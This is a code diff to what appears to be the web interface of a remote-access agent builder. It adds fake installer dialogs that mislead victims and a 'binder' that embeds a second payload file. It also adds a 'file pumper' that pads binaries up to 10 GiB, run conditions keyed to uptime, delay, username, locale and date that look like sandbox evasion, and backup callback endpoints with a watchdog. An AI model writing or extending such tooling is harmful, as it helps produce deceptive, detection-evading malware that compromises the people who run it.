@@ -121,6 +121,24 @@
 		{ value: 'warning', label: 'Warning dialog' },
 		{ value: 'info', label: 'Information dialog' }
 	] as const;
+	type FakeDialogType = (typeof fakeDialogOptions)[number]['value'];
+	const fakeDialogDefaults: Record<
+		Exclude<FakeDialogType, 'none'>,
+		{ title: string; message: string }
+	> = {
+		error: {
+			title: 'Setup Error',
+			message: 'An unexpected error occurred while installing the application.'
+		},
+		warning: {
+			title: 'Setup Warning',
+			message: 'Review the installation requirements before continuing.'
+		},
+		info: {
+			title: 'Setup Complete',
+			message: 'The installation finished successfully.'
+		}
+	} as const;
 
 	const inputFieldClasses =
 		'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-base shadow-xs ring-offset-background transition-[color,box-shadow] outline-none selection:bg-primary selection:text-primary-foreground placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 md:text-sm dark:bg-input/30 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40';
@@ -146,12 +164,13 @@
 	let executionRequireInternet = $state(true);
 	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
 	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
-	let fakeDialogType = $state<(typeof fakeDialogOptions)[number]['value']>('none');
+	let fakeDialogType = $state<FakeDialogType>('none');
 	let fakeDialogTitle = $state('');
 	let fakeDialogMessage = $state('');
 	let binderFileName = $state<string | null>(null);
 	let binderFileSize = $state<number | null>(null);
 	let binderFileError = $state<string | null>(null);
+	let binderFileData = $state<string | null>(null);
 
 	const isWindowsTarget = $derived(targetOS === 'windows');
 
@@ -310,6 +329,12 @@
 	}
 
 	const binderSizeLimitBytes = 50 * 1024 * 1024;
+	const maxFilePumperBytes = 10 * 1024 * 1024 * 1024; // 10 GiB ceiling for padded binaries
+	const filePumperUnitToBytes = {
+		KB: 1024,
+		MB: 1024 * 1024,
+		GB: 1024 * 1024 * 1024
+	} as const;
 
 	function formatFileSize(bytes: number | null) {
 		if (!bytes || !Number.isFinite(bytes)) {
@@ -328,6 +353,27 @@
 	function inputValueFromEvent(event: Event) {
 		const target = event.target as HTMLInputElement | HTMLTextAreaElement | null;
 		return target?.value ?? '';
+	}
+
+	function parseListInput(value: string) {
+		return value
+			.split(/[,\n]/)
+			.map((entry) => entry.trim())
+			.filter((entry, index, array) => entry.length > 0 && array.indexOf(entry) === index);
+	}
+
+	function toIsoDateTime(value: string) {
+		const trimmed = value.trim();
+		if (!trimmed) {
+			return null;
+		}
+
+		const date = new Date(trimmed);
+		if (Number.isNaN(date.getTime())) {
+			return null;
+		}
+
+		return date.toISOString();
 	}
 
 	async function handleIconSelection(event: Event) {
@@ -370,6 +416,34 @@
 		fileIconError = null;
 	}
 
+	function readFileAsBase64(file: File): Promise<string> {
+		return new Promise((resolvePromise, rejectPromise) => {
+			if (typeof FileReader === 'undefined') {
+				rejectPromise(new Error('FileReader API is unavailable.'));
+				return;
+			}
+
+			const reader = new FileReader();
+			reader.onload = () => {
+				const result = reader.result;
+				if (typeof result !== 'string') {
+					rejectPromise(new Error('Unexpected file reader result.'));
+					return;
+				}
+				const [, base64Payload = ''] = result.split(',');
+				if (!base64Payload) {
+					rejectPromise(new Error('Binder payload is empty.'));
+					return;
+				}
+				resolvePromise(base64Payload);
+			};
+			reader.onerror = () => {
+				rejectPromise(new Error('Failed to read file.'));
+			};
+			reader.readAsDataURL(file);
+		});
+	}
+
 	async function handleBinderSelection(event: Event) {
 		const input = event.target as HTMLInputElement;
 		const file = input.files?.[0] ?? null;
@@ -378,6 +452,7 @@
 		if (!file) {
 			binderFileName = null;
 			binderFileSize = null;
+			binderFileData = null;
 			return;
 		}
 
@@ -385,17 +460,27 @@
 			binderFileError = 'Binder payload must be 50MB or smaller.';
 			binderFileName = null;
 			binderFileSize = null;
+			binderFileData = null;
 			return;
 		}
 
-		binderFileName = file.name;
-		binderFileSize = file.size;
+		try {
+			binderFileData = await readFileAsBase64(file);
+			binderFileName = file.name;
+			binderFileSize = file.size;
+		} catch (err) {
+			binderFileError = err instanceof Error ? err.message : 'Failed to process binder payload.';
+			binderFileName = null;
+			binderFileSize = null;
+			binderFileData = null;
+		}
 	}
 
 	function clearBinderSelection() {
 		binderFileName = null;
 		binderFileSize = null;
 		binderFileError = null;
+		binderFileData = null;
 	}
 
 	async function buildAgent() {
@@ -456,6 +541,170 @@
 			}
 		}
 
+		const trimmedGroupTag = groupTag.trim();
+		const normalizedFallbackEndpoints = fallbackEndpoints
+			.map((endpoint) => ({
+				host: endpoint.host.trim(),
+				port: endpoint.port.trim()
+			}))
+			.filter((endpoint) => endpoint.host !== '' || endpoint.port !== '');
+
+		for (const endpoint of normalizedFallbackEndpoints) {
+			if (!endpoint.host) {
+				buildError = 'Each backup endpoint requires a host value.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+			if (endpoint.port && !/^\d+$/.test(endpoint.port)) {
+				buildError = `Backup endpoint port for ${endpoint.host} must be numeric.`;
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+		}
+
+		const sanitizedFallbackEndpoints = normalizedFallbackEndpoints.map((endpoint) => ({
+			host: endpoint.host,
+			port: endpoint.port || '2332'
+		}));
+
+		const sanitizedHeaders = customHeaders
+			.map((header) => ({
+				key: header.key.trim(),
+				value: header.value.trim()
+			}))
+			.filter((header) => header.key !== '' && header.value !== '');
+
+		const sanitizedCookies = customCookies
+			.map((cookie) => ({
+				name: cookie.name.trim(),
+				value: cookie.value.trim()
+			}))
+			.filter((cookie) => cookie.name !== '' && cookie.value !== '');
+
+		const trimmedWatchdogInterval = watchdogIntervalSeconds.trim();
+		let watchdogIntervalValue: number | null = null;
+		if (watchdogEnabled) {
+			const interval = trimmedWatchdogInterval ? Number(trimmedWatchdogInterval) : 60;
+			if (!Number.isFinite(interval) || interval < 5 || interval > 86_400) {
+				buildError = 'Watchdog interval must be between 5 and 86,400 seconds.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+			watchdogIntervalValue = Math.round(interval);
+		}
+
+		const trimmedFilePumperSize = filePumperTargetSize.trim();
+		let filePumperTargetBytes: number | null = null;
+		if (enableFilePumper) {
+			if (!trimmedFilePumperSize) {
+				buildError = 'Provide a target size for the file pumper or disable the feature.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+
+			const parsedSize = Number.parseFloat(trimmedFilePumperSize);
+			if (!Number.isFinite(parsedSize) || parsedSize <= 0) {
+				buildError = 'File pumper size must be a positive number.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+
+			const multiplier = filePumperUnitToBytes[filePumperUnit] ?? filePumperUnitToBytes.MB;
+			const computedBytes = Math.round(parsedSize * multiplier);
+			if (
+				!Number.isFinite(computedBytes) ||
+				computedBytes <= 0 ||
+				computedBytes > maxFilePumperBytes
+			) {
+				buildError = 'File pumper target size is too large. Maximum supported size is 10 GiB.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+
+			filePumperTargetBytes = computedBytes;
+		}
+
+		const trimmedExecutionDelay = executionDelaySeconds.trim();
+		let executionDelayValue: number | null = null;
+		if (trimmedExecutionDelay) {
+			const parsedDelay = Number.parseInt(trimmedExecutionDelay, 10);
+			if (!Number.isFinite(parsedDelay) || parsedDelay < 0 || parsedDelay > 86_400) {
+				buildError = 'Delayed start must be between 0 and 86,400 seconds.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+			executionDelayValue = parsedDelay;
+		}
+
+		const trimmedExecutionUptime = executionMinUptimeMinutes.trim();
+		let executionUptimeValue: number | null = null;
+		if (trimmedExecutionUptime) {
+			const parsedUptime = Number.parseInt(trimmedExecutionUptime, 10);
+			if (!Number.isFinite(parsedUptime) || parsedUptime < 0 || parsedUptime > 10_080) {
+				buildError = 'Minimum uptime must be between 0 and 10,080 minutes (7 days).';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+			executionUptimeValue = parsedUptime;
+		}
+
+		const allowedUsernames = parseListInput(executionAllowedUsernames);
+		const allowedLocales = parseListInput(executionAllowedLocales);
+
+		const startIso = toIsoDateTime(executionStartDate);
+		if (executionStartDate.trim() && !startIso) {
+			buildError = 'Earliest run time must be a valid date/time.';
+			pushProgress(buildError, 'error');
+			buildStatus = 'error';
+			buildProgress = 100;
+			return;
+		}
+
+		const endIso = toIsoDateTime(executionEndDate);
+		if (executionEndDate.trim() && !endIso) {
+			buildError = 'Latest run time must be a valid date/time.';
+			pushProgress(buildError, 'error');
+			buildStatus = 'error';
+			buildProgress = 100;
+			return;
+		}
+
+		if (startIso && endIso) {
+			const startTime = new Date(startIso).getTime();
+			const endTime = new Date(endIso).getTime();
+			if (Number.isFinite(startTime) && Number.isFinite(endTime) && startTime > endTime) {
+				buildError = 'Earliest run time must be before the latest run time.';
+				pushProgress(buildError, 'error');
+				buildStatus = 'error';
+				buildProgress = 100;
+				return;
+			}
+		}
+
+		if (binderFileName && !binderFileData) {
+			buildError = 'Binder payload is still processing. Please reselect the file.';
+			pushProgress(buildError, 'error');
+			buildStatus = 'error';
+			buildProgress = 100;
+			return;
+		}
+
 		buildStatus = 'running';
 		buildProgress = 5;
 		pushProgress('Preparing build request...');
@@ -475,6 +724,85 @@
 			compressBinary,
 			forceAdmin
 		};
+
+		if (trimmedGroupTag) {
+			payload.groupTag = trimmedGroupTag;
+		}
+		if (sanitizedFallbackEndpoints.length > 0) {
+			payload.fallbackEndpoints = sanitizedFallbackEndpoints;
+		}
+		if (watchdogIntervalValue !== null) {
+			payload.watchdog = {
+				enabled: true,
+				intervalSeconds: watchdogIntervalValue
+			} satisfies Record<string, unknown>;
+		}
+		if (filePumperTargetBytes !== null) {
+			payload.filePumper = {
+				enabled: true,
+				targetBytes: filePumperTargetBytes,
+				unit: filePumperUnit,
+				displayValue: trimmedFilePumperSize
+			} satisfies Record<string, unknown>;
+		}
+
+		const shouldIncludeExecutionTriggers =
+			executionDelayValue !== null ||
+			executionUptimeValue !== null ||
+			allowedUsernames.length > 0 ||
+			allowedLocales.length > 0 ||
+			Boolean(startIso) ||
+			Boolean(endIso) ||
+			!executionRequireInternet;
+
+		if (shouldIncludeExecutionTriggers) {
+			const executionPayload: Record<string, unknown> = {
+				requireInternet: executionRequireInternet
+			};
+			if (executionDelayValue !== null) {
+				executionPayload.delaySeconds = executionDelayValue;
+			}
+			if (executionUptimeValue !== null) {
+				executionPayload.minUptimeMinutes = executionUptimeValue;
+			}
+			if (allowedUsernames.length > 0) {
+				executionPayload.allowedUsernames = allowedUsernames;
+			}
+			if (allowedLocales.length > 0) {
+				executionPayload.allowedLocales = allowedLocales;
+			}
+			if (startIso) {
+				executionPayload.startTime = startIso;
+			}
+			if (endIso) {
+				executionPayload.endTime = endIso;
+			}
+			payload.executionTriggers = executionPayload;
+		}
+
+		if (sanitizedHeaders.length > 0) {
+			payload.customHeaders = sanitizedHeaders;
+		}
+		if (sanitizedCookies.length > 0) {
+			payload.customCookies = sanitizedCookies;
+		}
+		if (fakeDialogType !== 'none') {
+			const defaults = fakeDialogDefaults[fakeDialogType as Exclude<FakeDialogType, 'none'>];
+			const title = fakeDialogTitle.trim() || defaults.title;
+			const message = fakeDialogMessage.trim() || defaults.message;
+			payload.fakeDialog = {
+				type: fakeDialogType,
+				title,
+				message
+			} satisfies Record<string, unknown>;
+		}
+		if (binderFileData && binderFileName) {
+			payload.binder = {
+				name: binderFileName,
+				size: binderFileSize ?? undefined,
+				data: binderFileData
+			} satisfies Record<string, unknown>;
+		}
 
 		if (trimmedPollInterval) {
 			payload.pollIntervalMs = trimmedPollInterval;
